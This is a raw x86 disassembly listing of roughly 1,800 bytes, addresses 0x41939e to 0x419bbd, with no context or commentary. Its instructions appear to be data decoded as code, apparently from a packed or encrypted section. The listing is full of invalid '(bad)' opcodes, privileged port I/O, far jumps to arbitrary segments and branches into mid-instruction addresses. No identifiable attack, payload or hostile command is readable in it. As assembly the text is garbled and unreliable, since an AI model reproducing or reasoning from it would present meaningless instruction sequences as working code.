  41939e:	and    al,bh
  4193a0:	xchg   ebp,eax
  4193a1:	push   0xfec9fdeb
  4193a6:	sti    
  4193a7:	cs das 
  4193a9:	or     al,bl
  4193ab:	pop    ss
  4193ac:	dec    eax
  4193ad:	jb     0x41935a
  4193af:	mov    ebp,0x3de4e599
  4193b4:	mov    cl,0x0
  4193b6:	mov    BYTE PTR [edi-0x27],ch
  4193b9:	fadd   DWORD PTR [ecx+0x7951d657]
  4193bf:	or     al,0xcd
  4193c1:	test   DWORD PTR [edi],edi
  4193c3:	jnp    0x4193ca
  4193c5:	call   0xc008805f
  4193ca:	call   0x27a0:0x40762895
  4193d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193d2:	mov    ch,dl
  4193d4:	xor    dh,ch
  4193d6:	fsub   DWORD PTR [eax]
  4193d8:	jae    0x41939a
  4193da:	pusha  
  4193db:	(bad)  
  4193dd:	dec    edi
  4193de:	push   ecx
  4193df:	les    esp,FWORD PTR [ebp-0x2b420611]
  4193e5:	mov    edx,0xc0ba104a
  4193ea:	mov    bl,0x8c
  4193ec:	sub    DWORD PTR [ebx],edi
  4193ee:	sub    esi,DWORD PTR [ebp-0x68]
  4193f1:	adc    eax,0x6407245
  4193f6:	cmp    al,0xab
  4193f8:	stos   DWORD PTR es:[edi],eax
  4193f9:	addr16 or eax,0x6953b2bd
  4193ff:	mov    al,0xc1
  419401:	xor    ah,BYTE PTR [eax+esi*4+0x68]
  419405:	add    dh,0xce
  419408:	cmc    
  419409:	mov    edi,0x646a241d
  41940e:	push   0x4a
  419410:	inc    eax
  419411:	jl     0x4193a9
  419413:	sub    esp,DWORD PTR [ebp+0x3a14c3b0]
  419419:	adc    ebx,DWORD PTR [esi]
  41941b:	fisttp DWORD PTR [ecx+edi*4]
  41941e:	enter  0x4074,0xf4
  419422:	lods   al,BYTE PTR ds:[esi]
  419423:	shr    BYTE PTR [ecx],cl
  419425:	or     eax,0x83ce3db2
  41942a:	stc    
  41942b:	dec    esi
  41942c:	cmp    ebx,DWORD PTR [ebp+0x7aea731e]
  419432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419433:	mov    ds:0xa796b470,al
  419439:	xor    cl,BYTE PTR [edi-0x5885abfa]
  41943f:	in     al,0x7d
  419441:	xor    edi,esi
  419443:	push   esi
  419444:	jbe    0x4193ff
  419446:	retf   
  419447:	push   es
  419448:	pop    edi
  419449:	arpl   WORD PTR [esi],di
  41944b:	mov    edx,0xce7d1749
  419450:	outs   dx,BYTE PTR ds:[esi]
  419451:	pop    ebx
  419452:	sub    eax,0xdb26fd78
  419457:	sub    esp,DWORD PTR [esp+edi*4]
  41945a:	inc    ecx
  41945b:	(bad)  
  41945c:	and    cl,dl
  41945e:	bound  edi,QWORD PTR [ecx-0x75a94450]
  419464:	retf   
  419465:	mov    ss,ecx
  419467:	push   0xae6285df
  41946c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41946d:	jnp    0x419414
  41946f:	and    BYTE PTR [eax],dh
  419471:	jp     0x419417
  419473:	in     al,0x21
  419475:	fldcw  WORD PTR ss:[eax]
  419478:	stos   DWORD PTR es:[edi],eax
  419479:	xor    ebx,DWORD PTR [ebp+0x3a62f92d]
  41947f:	and    eax,0x719a2ca0
  419484:	mov    ebp,0x80ed0ec0
  419489:	jnp    0x419482
  41948b:	lea    eax,[ebp-0x54177cf1]
  419491:	sbb    bh,ch
  419493:	jmp    0xbf619c71
  419498:	iret   
  419499:	je     0x41950e
  41949b:	inc    ecx
  41949c:	in     eax,0xd7
  41949e:	hlt    
  41949f:	add    BYTE PTR [edi],bh
  4194a1:	aad    0xe3
  4194a3:	add    bl,BYTE PTR [edi+edi*1+0x640f2b76]
  4194aa:	inc    edi
  4194ab:	xchg   esi,eax
  4194ac:	cs (bad) 
  4194ae:	jg     0x419442
  4194b0:	out    dx,eax
  4194b1:	inc    edx
  4194b2:	stos   BYTE PTR es:[edi],al
  4194b3:	mov    al,0x85
  4194b5:	xor    al,0x44
  4194b7:	jnp    0x419498
  4194b9:	jmp    0x419491
  4194bb:	hlt    
  4194bc:	pop    ebp
  4194bd:	stos   DWORD PTR es:[edi],eax
  4194be:	outs   dx,DWORD PTR ds:[esi]
  4194bf:	or     BYTE PTR [ebx-0x6cf6373a],dl
  4194c5:	adc    eax,0xa7f196c
  4194ca:	push   ds
  4194cb:	int    0x5e
  4194cd:	leave  
  4194ce:	ret    
  4194cf:	adc    edx,DWORD PTR [esi]
  4194d1:	mov    ch,0xc2
  4194d3:	imul   esi,DWORD PTR [ebp+0x44],0xc0d33c5a
  4194da:	pusha  
  4194db:	loope  0x419537
  4194dd:	sub    ah,BYTE PTR [edi+0x4d47b6db]
  4194e3:	lahf   
  4194e4:	in     al,dx
  4194e5:	inc    ebp
  4194e6:	rcl    BYTE PTR [ebx+0xc659531],0x95
  4194ed:	rcr    BYTE PTR [edx+ecx*2+0x67],0xa0
  4194f2:	cmp    al,bh
  4194f4:	out    0x1a,al
  4194f6:	xchg   ebp,eax
  4194f7:	out    dx,al
  4194f8:	mov    esi,0x97fc6a5
  4194fd:	or     DWORD PTR fs:[edi-0x21],ebp
  419501:	cs loopne 0x41951d
  419504:	and    al,0x1d
  419506:	or     esp,eax
  419508:	leave  
  419509:	mov    ebp,0x272c7fbb
  41950e:	and    eax,DWORD PTR [esi]
  419510:	out    dx,eax
  419511:	das    
  419512:	icebp  
  419513:	(bad)  
  419515:	pop    edi
  419516:	cwde   
  419517:	add    cl,BYTE PTR [esp+edx*4+0x5c]
  41951b:	lock stos BYTE PTR es:[edi],al
  41951d:	addr16 jmp 0x41956d
  419520:	and    al,0xb6
  419522:	out    dx,al
  419523:	jo     0x4194b9
  419525:	mov    esi,0x2797cc18
  41952a:	jge    0x419518
  41952c:	mov    dh,0x6f
  41952e:	fnstsw WORD PTR [ebx+0xf925d60]
  419534:	xchg   ebx,eax
  419535:	les    edx,FWORD PTR [ecx]
  419537:	cmp    DWORD PTR ds:0x8d2552ad,ebp
  41953d:	xor    al,0xff
  41953f:	pushf  
  419540:	test   DWORD PTR [esi-0x1e],esi
  419543:	xor    al,0xe0
  419545:	frstor [ebp+0x68]
  419548:	adc    BYTE PTR [esi+0x622ee552],dl
  41954e:	cmp    BYTE PTR [esi-0x689b1a22],cl
  419554:	in     eax,dx
  419555:	jle    0x4194ff
  419557:	add    BYTE PTR [edx],bh
  419559:	cdq    
  41955a:	leave  
  41955b:	pop    ebx
  41955c:	hlt    
  41955d:	push   edi
  41955e:	mov    BYTE PTR [ecx+0x5b53d271],bl
  419564:	inc    ecx
  419565:	and    cl,dh
  419567:	mov    dh,0x9f
  419569:	mov    dl,0xcc
  41956b:	jb     0x419550
  41956d:	nop
  41956e:	pop    esi
  41956f:	div    BYTE PTR [ebp+ebp*8-0x18ed057e]
  419576:	clc    
  419577:	or     eax,0xcf286a22
  41957c:	iret   
  41957d:	out    0x91,eax
  41957f:	jmp    0x597:0xd1268bb0
  419586:	mov    dl,0x75
  419588:	cmp    dl,bh
  41958a:	inc    esp
  41958b:	pusha  
  41958c:	xor    al,BYTE PTR ds:0x9d6c26fb
  419592:	xchg   DWORD PTR [edi],ecx
  419594:	pop    eax
  419595:	jmp    0xe2d3:0xfb3ae9d0
  41959c:	mul    BYTE PTR [edi-0x5cc59675]
  4195a2:	add    bh,bl
  4195a4:	dec    esi
  4195a5:	xor    eax,0x770ae514
  4195aa:	adc    bl,ch
  4195ac:	xchg   ecx,eax
  4195ad:	mov    esp,0x4309e398
  4195b2:	jmp    0x90ed:0x97152999
  4195b9:	add    ah,BYTE PTR [ecx-0x35cc3e6f]
  4195bf:	jecxz  0x4195c2
  4195c1:	test   eax,0xad199589
  4195c6:	mov    esp,0xaad82ede
  4195cb:	call   0x7cd65d11
  4195d0:	call   0x2a05:0xc37a5dec
  4195d7:	pop    es
  4195d8:	loope  0x41959f
  4195da:	mov    ?,WORD PTR [ebp-0x37]
  4195dd:	loopne 0x41963f
  4195df:	mul    ecx
  4195e1:	mov    esp,0x2463b54e
  4195e6:	ret    
  4195e7:	leave  
  4195e8:	test   eax,0xc1dc6632
  4195ed:	and    eax,0xf7ff1a63
  4195f2:	pop    edi
  4195f3:	jmp    0x2966d6d7
  4195f8:	jne    0x41959b
  4195fa:	sbb    BYTE PTR [edi+eiz*1+0x3ce21864],bl
  419601:	addr16 push ecx
  419603:	retf   
  419604:	call   0x89da66f7
  419609:	sub    DWORD PTR [esi+0x38],esp
  41960c:	pop    eax
  41960d:	addr16 loope 0x41965e
  419610:	fnsave [edx]
  419612:	mov    edx,0xd514b989
  419617:	jb     0x419616
  419619:	dec    eax
  41961a:	jno    0x4195a7
  41961c:	mov    DWORD PTR [edx+0x71],edi
  41961f:	repz mov ecx,?
  419622:	popf   
  419623:	jle    0x926aae4c
  419629:	jmp    0xa9d1:0xb30a1447
  419630:	mov    BYTE PTR [esi],al
  419632:	adc    al,0x53
  419634:	ins    BYTE PTR es:[edi],dx
  419635:	xor    DWORD PTR [ebp+0x1092e43b],eax
  41963b:	lahf   
  41963c:	push   eax
  41963d:	xor    eax,0x401d6c66
  419642:	mov    bl,0x76
  419644:	jle    0x4196a2
  419646:	je     0x4195ce
  419648:	and    al,0xfe
  41964a:	adc    eax,0xecdf5c31
  41964f:	sahf   
  419650:	add    al,0x88
  419652:	push   ebp
  419653:	pop    esp
  419654:	gs inc eax
  419656:	(bad)  
  419657:	or     ebp,DWORD PTR [ebx-0x53bdc137]
  41965d:	lock jbe 0x41965f
  419660:	adc    DWORD PTR [edi],edx
  419662:	aaa    
  419663:	cmp    al,cl
  419665:	xor    bl,al
  419667:	pop    esp
  419668:	jmp    0x8301:0xa377c4ea
  41966f:	push   ebx
  419670:	inc    esp
  419671:	jmp    0x2f70:0xa8b95d5b
  419678:	sbb    ah,cl
  41967a:	cdq    
  41967b:	sbb    edi,DWORD PTR [ebp-0x5942c5b0]
  419681:	inc    edx
  419682:	xchg   esi,eax
  419683:	xchg   ebx,eax
  419684:	sbb    ah,0x8
  419687:	cmp    eax,0x4b72aace
  41968c:	sub    DWORD PTR [ebx],ebx
  41968e:	ins    DWORD PTR es:[edi],dx
  41968f:	ins    BYTE PTR es:[edi],dx
  419690:	dec    eax
  419691:	iret   
  419692:	pop    esp
  419693:	cwde   
  419694:	sbb    DWORD PTR [ebx+0x25f1820c],esp
  41969a:	(bad)  
  41969b:	jns    0x419647
  41969d:	enter  0x4f43,0x62
  4196a1:	add    BYTE PTR [ebx-0x1c],dh
  4196a4:	xchg   ebp,eax
  4196a5:	clc    
  4196a6:	mov    edi,0x90498c52
  4196ab:	pop    ecx
  4196ac:	mov    ah,bh
  4196ae:	adc    BYTE PTR [edi-0x254ad390],ah
  4196b4:	call   0x68c6f202
  4196b9:	fist   DWORD PTR [esi+0x40]
  4196bc:	int    0x20
  4196be:	fidiv  DWORD PTR [ebp-0x70]
  4196c1:	imul   edi,DWORD PTR [esi],0xf80dee4a
  4196c7:	push   0xf19fffaf
  4196cc:	sbb    dl,dl
  4196ce:	and    esp,0x120c2384
  4196d4:	mov    ecx,0x52181cf6
  4196d9:	cli    
  4196da:	xor    BYTE PTR [edi+0x3c0d1d],al
  4196e0:	outs   dx,DWORD PTR ds:[esi]
  4196e1:	jmp    0x7bb2:0x41c303e4
  4196e8:	icebp  
  4196e9:	inc    ebx
  4196ea:	pop    eax
  4196eb:	inc    eax
  4196ec:	idiv   DWORD PTR [ecx-0xa298b56]
  4196f2:	add    BYTE PTR fs:[ebp-0x5a],bl
  4196f6:	int    0x68
  4196f8:	jle    0x419706
  4196fa:	ret    
  4196fb:	inc    ebx
  4196fc:	xlat   BYTE PTR ds:[ebx]
  4196fd:	dec    edx
  4196fe:	pop    ebp
  4196ff:	(bad)  
  419700:	mov    eax,0x203e418
  419705:	push   esi
  419706:	ja     0x419705
  419708:	iret   
  419709:	(bad)  
  41970a:	pusha  
  41970b:	dec    eax
  41970c:	test   DWORD PTR [edi+esi*1-0x5],ecx
  419710:	shr    BYTE PTR [ecx+esi*4+0x3ccb7bd3],cl
  419717:	loopne 0x4196c5
  419719:	cmp    dl,BYTE PTR [ebx+edx*8-0x28]
  41971d:	out    0xd7,al
  41971f:	sub    eax,0xd061b765
  419724:	jbe    0x41976f
  419726:	sbb    BYTE PTR [esp+ebp*1+0x53],al
  41972a:	push   cs
  41972b:	adc    BYTE PTR [eax],al
  41972d:	loop   0x41972d
  41972f:	and    ebp,eax
  419731:	jb     0x419710
  419733:	inc    ecx
  419734:	pop    ebx
  419735:	rol    BYTE PTR [eax],cl
  419737:	mov    ah,0x8
  419739:	or     esp,DWORD PTR [edi+0x63]
  41973c:	pop    es
  41973d:	and    eax,0x9102fe22
  419742:	bound  edi,QWORD PTR [ebp-0x46941dab]
  419748:	dec    esi
  419749:	mov    ebx,0xe65a708d
  41974e:	jmp    0x4196d3
  419750:	xchg   edx,eax
  419751:	fst    st(0)
  419753:	add    dh,BYTE PTR [esi]
  419755:	lds    ecx,FWORD PTR [ebp+0x6030c85]
  41975b:	or     cl,dh
  41975d:	jo     0x41975f
  41975f:	fucomp st(0)
  419761:	sub    DWORD PTR [edi],eax
  419763:	jl     0x4196f5
  419765:	hlt    
  419766:	adc    BYTE PTR [edi-0x2a],cl
  419769:	jge    0x419776
  41976b:	jmp    DWORD PTR [ebp-0x76047320]
  419771:	loopne 0x4197c6
  419773:	inc    ebx
  419774:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419775:	fistp  DWORD PTR [edi+0x60]
  419778:	cmp    ch,BYTE PTR [edx-0x5c309f16]
  41977e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41977f:	pop    ebp
  419780:	push   ecx
  419781:	jno    0x41978c
  419783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419784:	inc    ebp
  419785:	cmp    eax,0xf49b5d41
  41978a:	sbb    dl,ch
  41978c:	adc    DWORD PTR [ebp-0x57eeec55],ecx
  419792:	je     0x4197ab
  419794:	stos   BYTE PTR es:[edi],al
  419795:	jle    0x4197c0
  419797:	adc    esi,DWORD PTR [ebx-0x9757f57]
  41979d:	cmp    esp,DWORD PTR [eax+ebp*2]
  4197a0:	add    eax,0xe4a89426
  4197a5:	mov    edx,0xecf70f46
  4197aa:	cmp    ch,BYTE PTR ss:[edi-0x78]
  4197ae:	or     BYTE PTR [ebx-0x1f8ae3d4],cl
  4197b4:	std    
  4197b5:	mov    ah,0xab
  4197b7:	scas   eax,DWORD PTR es:[edi]
  4197b8:	scas   al,BYTE PTR es:[edi]
  4197b9:	das    
  4197ba:	test   DWORD PTR [ecx],ebp
  4197bc:	ret    
  4197bd:	jns    0x419787
  4197bf:	and    eax,0x53b2e0a1
  4197c4:	and    ebx,DWORD PTR [edx+0x1c]
  4197c7:	mov    edi,0x4949e779
  4197cc:	mov    ecx,0x46e31e29
  4197d1:	(bad)  
  4197d2:	sbb    BYTE PTR [ebx],cl
  4197d4:	jnp    0x4197da
  4197d6:	inc    eax
  4197d7:	sbb    bl,BYTE PTR [edi+edi*8-0x1cbf3c1a]
  4197de:	or     eax,0xf67d6387
  4197e3:	ret    
  4197e4:	arpl   WORD PTR [edx-0x1d],cx
  4197e7:	sbb    eax,0x7205ae91
  4197ec:	mov    edx,0x6f7baa07
  4197f1:	or     eax,0x2b420820
  4197f6:	xor    BYTE PTR [eax+ecx*4+0x60],al
  4197fa:	(bad)  
  4197fb:	hlt    
  4197fc:	mov    bl,0x6b
  4197fe:	and    edi,DWORD PTR [edx-0x577b6abf]
  419804:	dec    ebp
  419805:	aad    0xe0
  419807:	js     0x4197e1
  419809:	stc    
  41980a:	ja     0x419843
  41980c:	int3   
  41980d:	add    BYTE PTR [edi-0x9],dh
  419810:	pop    eax
  419811:	sbb    al,0xdc
  419813:	mov    ds:0x9f6d5e12,eax
  419818:	sub    eax,0xdedc40e1
  41981d:	fisubr WORD PTR [edi]
  41981f:	cmp    eax,0x1c472dc
  419824:	(bad)  
  419826:	xor    al,BYTE PTR [edx+0x4684f2e0]
  41982c:	(bad)  
  41982d:	add    al,0xd4
  41982f:	jl     0x419869
  419831:	js     0x4197ef
  419833:	(bad)  
  419836:	jae    0x4197f7
  419838:	sar    ecx,1
  41983a:	das    
  41983b:	dec    eax
  41983c:	pop    edx
  41983e:	sbb    eax,0x7ad7782a
  419843:	sub    BYTE PTR [esi-0x2a1ea058],cl
  419849:	xchg   DWORD PTR [eax+0x737a2c39],edi
  41984f:	fwait
  419850:	or     BYTE PTR [edi+0x3c],cl
  419853:	adc    esp,DWORD PTR [ebp+0xee79726]
  419859:	push   esp
  41985a:	and    edi,DWORD PTR [edx-0x4d]
  41985d:	xlat   BYTE PTR ds:[ebx]
  41985e:	iret   
  41985f:	cmp    esi,DWORD PTR [eax]
  419861:	and    BYTE PTR [edx],bl
  419863:	jl     0x4198d0
  419865:	out    dx,al
  419866:	inc    eax
  419867:	imul   edx,DWORD PTR [eax-0x3bb6ba1],0xffffffb8
  41986e:	out    0xd5,eax
  419870:	ficomp DWORD PTR [ecx]
  419872:	or     DWORD PTR [edx],ebp
  419874:	mov    ecx,0xbc5a2298
  419879:	cmp    edx,DWORD PTR [ebx]
  41987b:	arpl   WORD PTR [ebp-0x11],sp
  41987e:	hlt    
  41987f:	or     esi,DWORD PTR [edi+0x2f]
  419882:	jae    0x41986d
  419884:	or     dl,BYTE PTR [ebp+0x22ca0d22]
  41988a:	jb     0x4198c4
  41988c:	xchg   esi,eax
  41988d:	pop    es
  41988e:	frstor [ebx-0x48557bae]
  419894:	stos   DWORD PTR es:[edi],eax
  419895:	adc    eax,0x16ec8bfe
  41989a:	sahf   
  41989b:	push   eax
  41989c:	xchg   esp,eax
  41989d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41989e:	out    0xf7,eax
  4198a0:	es dec edx
  4198a2:	stos   BYTE PTR es:[edi],al
  4198a3:	(bad)  
  4198a4:	sbb    al,al
  4198a6:	scas   eax,DWORD PTR es:[edi]
  4198a7:	sub    al,0xad
  4198a9:	mov    sp,0xb489
  4198ad:	aaa    
  4198ae:	cmp    BYTE PTR [ecx+0x1ac786f6],0x6a
  4198b5:	jns    0x41985f
  4198b7:	mov    eax,ds:0x2377962f
  4198bc:	mov    cs,WORD PTR [edx-0x608d9591]
  4198c2:	mov    esp,0xd469cf6b
  4198c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198c8:	loopne 0x41993c
  4198ca:	aaa    
  4198cb:	xchg   esp,eax
  4198cc:	inc    esi
  4198cd:	ds jns 0x41992f
  4198d0:	fisubr DWORD PTR [ecx-0x49]
  4198d3:	push   ss
  4198d4:	ja     0x419888
  4198d6:	cmp    BYTE PTR [eax],cl
  4198d8:	jae    0x4198bf
  4198da:	and    ebx,DWORD PTR [edx-0x77bae8eb]
  4198e0:	mov    ds:0x5a912a6e,al
  4198e5:	xlat   BYTE PTR ds:[ebx]
  4198e6:	dec    edx
  4198e7:	pop    ds
  4198e8:	mov    edi,0x4c70e38b
  4198ed:	sub    dh,BYTE PTR [esi+0x1e0d9c59]
  4198f3:	xchg   edi,eax
  4198f4:	aas    
  4198f5:	into   
  4198f6:	aas    
  4198f7:	into   
  4198f8:	imul   ebp,DWORD PTR [edi],0x5828294e
  4198fe:	div    BYTE PTR [esp+ebx*8+0x7ee81be1]
  419905:	add    BYTE PTR [eax+0x6b],al
  419908:	dec    ebx
  419909:	mov    edx,0x12cacc86
  41990e:	in     al,0x37
  419910:	adc    edi,DWORD PTR [esi-0x59b742c0]
  419916:	dec    ecx
  419917:	dec    ebx
  419918:	stos   BYTE PTR es:[edi],al
  419919:	scas   eax,DWORD PTR es:[edi]
  41991a:	inc    esi
  41991b:	lods   al,BYTE PTR ds:[esi]
  41991c:	xchg   ebx,eax
  41991d:	test   al,0xef
  41991f:	pop    ss
  419920:	mov    cl,cl
  419922:	jmp    0x5046:0xe5f555af
  419929:	(bad)  
  41992a:	js     0x41999b
  41992c:	or     esp,DWORD PTR [eax+0x3e]
  41992f:	push   cs
  419930:	rcr    ah,0xd7
  419933:	cs jns 0x4198d3
  419936:	sti    
  419937:	jmp    0x5249:0xca0873c5
  41993e:	push   ecx
  41993f:	xchg   esi,eax
  419940:	xor    eax,0xc9c6ff58
  419945:	test   DWORD PTR ss:[ebx+ebx*2],eax
  419949:	fdivp  st(7),st
  41994b:	fdiv   DWORD PTR [ebx+esi*8]
  41994e:	(bad)  
  41994f:	(bad)  
  419951:	mov    BYTE PTR [ecx+esi*2],dh
  419954:	inc    ebx
  419955:	scas   al,BYTE PTR es:[edi]
  419956:	test   eax,esi
  419958:	outs   dx,DWORD PTR ds:[esi]
  419959:	int3   
  41995a:	and    al,0x97
  41995c:	mov    dl,0xa0
  41995e:	xchg   edx,eax
  41995f:	cmp    ch,dh
  419961:	cwde   
  419962:	xchg   edx,eax
  419963:	mov    eax,0xccece377
  419968:	or     eax,0x5aa19f0b
  41996d:	push   ss
  41996e:	pop    edi
  41996f:	retf   
  419970:	adc    dl,ch
  419972:	xchg   bl,al
  419974:	xor    BYTE PTR [ebp-0x47],ch
  419977:	jge    0x4199f1
  419979:	jo     0x4199bd
  41997b:	fisub  DWORD PTR [esi-0xf4cc848]
  419981:	test   DWORD PTR [edi+0x38],esp
  419984:	or     al,0xe6
  419986:	(bad)  
  419987:	pop    ds
  419988:	add    di,WORD PTR [ecx-0x46]
  41998c:	inc    ebp
  41998d:	add    BYTE PTR [ebx+0x7e0b610a],ch
  419993:	pop    esp
  419994:	xor    dl,al
  419996:	mov    ah,BYTE PTR [eax-0x4d]
  419999:	dec    esi
  41999a:	xchg   ecx,esi
  41999c:	leave  
  41999d:	enter  0xeb08,0x3c
  4199a1:	or     edx,DWORD PTR ds:0x9ed19b1c
  4199a7:	dec    ebx
  4199a8:	aam    0xc4
  4199aa:	sbb    dh,bh
  4199ac:	mul    DWORD PTR [ebx+ecx*1-0x13]
  4199b0:	mov    al,ds:0x9c1674d
  4199b5:	cli    
  4199b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199b7:	in     al,dx
  4199b8:	ss int 0x2a
  4199bb:	pop    ss
  4199bc:	add    ecx,DWORD PTR [esi-0x5b98f01e]
  4199c2:	inc    edi
  4199c3:	fnstsw WORD PTR [ebx+0x13429661]
  4199c9:	out    0xd2,al
  4199cb:	in     al,0xd3
  4199cd:	(bad)  
  4199cf:	push   cs
  4199d0:	lods   eax,DWORD PTR ds:[esi]
  4199d1:	mov    ah,0x1c
  4199d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199d4:	jle    0x4199df
  4199d6:	mov    ds:0x250fcadc,eax
  4199db:	mov    dl,0x83
  4199dd:	xchg   ebp,eax
  4199de:	pop    ecx
  4199df:	pop    edx
  4199e0:	or     esi,DWORD PTR [ecx]
  4199e2:	pop    ds
  4199e3:	outs   dx,DWORD PTR ds:[esi]
  4199e4:	push   esp
  4199e5:	xchg   esp,eax
  4199e6:	sbb    al,0xde
  4199e8:	mov    eax,0x7730019f
  4199ed:	retf   
  4199ee:	jbe    0x419a08
  4199f0:	xchg   DWORD PTR [edi-0x712b5afd],edx
  4199f6:	adc    eax,0xb90bc5f9
  4199fb:	cli    
  4199fc:	out    dx,eax
  4199fd:	or     eax,0xf3a2be2c
  419a02:	jle    0x4199a6
  419a04:	(bad)  
  419a05:	dec    eax
  419a06:	das    
  419a07:	and    cl,BYTE PTR [ebp+0x2a]
  419a0a:	adc    al,0x29
  419a0c:	js     0x4199ce
  419a0e:	jmp    0x6673:0xd25aff00
  419a15:	cmp    eax,0xff68e266
  419a1a:	add    esp,DWORD PTR [ecx-0x5590d01]
  419a20:	pop    ebx
  419a21:	jns    0x4199ae
  419a23:	hlt    
  419a24:	sub    BYTE PTR [eax+ecx*8],ch
  419a27:	pop    ecx
  419a28:	sti    
  419a29:	inc    ebp
  419a2a:	push   ss
  419a2b:	scas   al,BYTE PTR es:[edi]
  419a2c:	mov    eax,0xaff81847
  419a31:	xor    cl,dh
  419a33:	lods   al,BYTE PTR ds:[esi]
  419a34:	and    al,0x47
  419a36:	rcr    DWORD PTR [ebx],cl
  419a38:	in     eax,dx
  419a39:	fidivr DWORD PTR [ebx+0x7f]
  419a3c:	sub    bh,cl
  419a3e:	sub    DWORD PTR [edi+edx*4],ecx
  419a41:	sub    al,0x32
  419a43:	jo     0x419a25
  419a45:	ret    0x1f3b
  419a48:	div    DWORD PTR [edx+0x5c4ef0ec]
  419a4e:	mov    ebp,0xe1902b64
  419a53:	adc    al,0x9d
  419a55:	mov    ecx,esi
  419a57:	jl     0x419a67
  419a59:	adc    eax,0xb43a6f8
  419a5e:	inc    edi
  419a5f:	jno    0x419a14
  419a61:	inc    edi
  419a62:	mov    eax,ds:0x78a276ad
  419a67:	or     ecx,DWORD PTR [esi-0x7f]
  419a6a:	adc    eax,0x122f6272
  419a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a70:	out    0x36,eax
  419a72:	test   DWORD PTR [ebp-0xf],esi
  419a75:	inc    eax
  419a76:	dec    ebx
  419a77:	bound  ebp,QWORD PTR [ecx]
  419a79:	out    dx,al
  419a7a:	jnp    0x419a51
  419a7c:	mov    al,0x9a
  419a7e:	fmul   DWORD PTR [ecx-0x3a690d46]
  419a84:	push   ecx
  419a85:	into   
  419a86:	arpl   bp,sp
  419a88:	sbb    ah,bl
  419a8a:	xchg   BYTE PTR [ebx+0x7380ae42],cl
  419a90:	sar    al,cl
  419a92:	scas   al,BYTE PTR es:[edi]
  419a93:	fs pusha 
  419a95:	pop    eax
  419a96:	js     0x419af3
  419a98:	add    bl,BYTE PTR [esi-0x2891195b]
  419a9e:	fcmovb st,st(6)
  419aa0:	sbb    eax,0x44faf2ff
  419aa5:	mov    WORD PTR [edi],?
  419aa7:	(bad)  
  419aa8:	jle    0x419a7a
  419aaa:	adc    edx,DWORD PTR [ebp+0x71116680]
  419ab0:	pop    eax
  419ab1:	push   es
  419ab2:	ja     0x419a4f
  419ab4:	addr16 ss xchg ebp,eax
  419ab7:	pop    eax
  419ab8:	cwde   
  419ab9:	adc    cl,BYTE PTR [edx+0x43e7891f]
  419abf:	retf   0xe451
  419ac2:	shr    BYTE PTR [ecx+0x6cd9fb6a],0xc1
  419ac9:	dec    ebx
  419aca:	enter  0x5ba4,0xc4
  419ace:	les    eax,FWORD PTR [ebx+0x4d]
  419ad1:	adc    ecx,DWORD PTR [edi]
  419ad3:	js     0x419b16
  419ad5:	xchg   esi,eax
  419ad6:	stc    
  419ad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ad8:	jb     0x419aac
  419ada:	(bad)
  419add:	mov    bl,0x8d
  419adf:	cmp    BYTE PTR ds:0x2aaccdd6,ch
  419ae5:	adc    al,0x78
  419ae7:	push   ebp
  419ae8:	fs sub dh,0x3a
  419aec:	mov    eax,ds:0x628c5ba
  419af1:	mov    ah,BYTE PTR [edi+0x8]
  419af4:	xor    BYTE PTR [edx+0x4e06ebc2],ah
  419afa:	adc    DWORD PTR [esi+0x6a4639d5],esi
  419b00:	adc    DWORD PTR [edx+0x70],0xffffffee
  419b04:	ret    0x92a1
  419b07:	in     eax,0x14
  419b09:	sahf   
  419b0a:	lea    edi,[eax-0x32]
  419b0d:	xor    eax,0x7f037369
  419b12:	cmc    
  419b13:	adc    al,BYTE PTR [edi+0x41ce2d07]
  419b19:	out    0x8,al
  419b1b:	mov    al,ds:0x6b54ee5
  419b20:	iret   
  419b21:	int    0x96
  419b23:	xchg   BYTE PTR [ecx],cl
  419b25:	jae    0x419b6a
  419b27:	mov    dl,0xdb
  419b29:	lock mov ebx,0x548a93e8
  419b2f:	xchg   esi,eax
  419b30:	js     0x419aca
  419b32:	mov    ebp,0x2bcdf774
  419b37:	jae    0x419b78
  419b39:	mov    al,ds:0x638746f5
  419b3e:	or     edx,0x9
  419b41:	in     al,dx
  419b42:	push   esi
  419b43:	sti    
  419b44:	push   ebx
  419b45:	xlat   BYTE PTR ds:[ebx]
  419b46:	leave  
  419b47:	fwait
  419b48:	jp     0x419ba6
  419b4a:	mov    bl,0xa5
  419b4c:	aad    0x50
  419b4e:	cmc    
  419b4f:	rcr    DWORD PTR [esi-0x142697f9],0x1f
  419b56:	mov    bh,0xfd
  419b58:	jl     0x419b65
  419b5a:	push   edi
  419b5b:	call   0x733851b2
  419b60:	and    BYTE PTR [edx-0x30],bl
  419b63:	mov    eax,0x682257e6
  419b68:	and    eax,0x26d73ddb
  419b6d:	adc    WORD PTR [ebx],bp
  419b70:	xchg   BYTE PTR [eax],ch
  419b72:	pop    esi
  419b73:	sti    
  419b74:	lds    ecx,FWORD PTR [edx-0x46]
  419b77:	adc    BYTE PTR [ecx-0x1706b256],0x55
  419b7e:	cmc    
  419b7f:	mov    edx,0xee854df4
  419b84:	adc    edi,DWORD PTR ds:0x2697f473
  419b8a:	mov    bl,0x4a
  419b8c:	sub    BYTE PTR [esi-0x4fc6de47],ch
  419b92:	ds ret 0xf91d
  419b96:	jnp    0x419b71
  419b98:	jg     0x419b41
  419b9a:	ins    BYTE PTR es:[edi],dx
  419b9b:	mov    edx,0x5c54c052
  419ba0:	mov    ds:0x1cda776c,al
  419ba5:	shr    eax,1
  419ba7:	jp     0x419c1d
  419ba9:	retf   
  419baa:	sub    al,0xf
  419bac:	dec    ebp
  419bad:	jo     0x419b7f
  419baf:	mov    eax,DWORD PTR [edx]
  419bb1:	push   esp
  419bb2:	add    DWORD PTR [ebx-0x586bb9cf],esi
  419bb8:	cwde   
  419bb9:	jl     0x419ba3
  419bbb:	cmp    al,0xe2
  419bbd:	lahf   
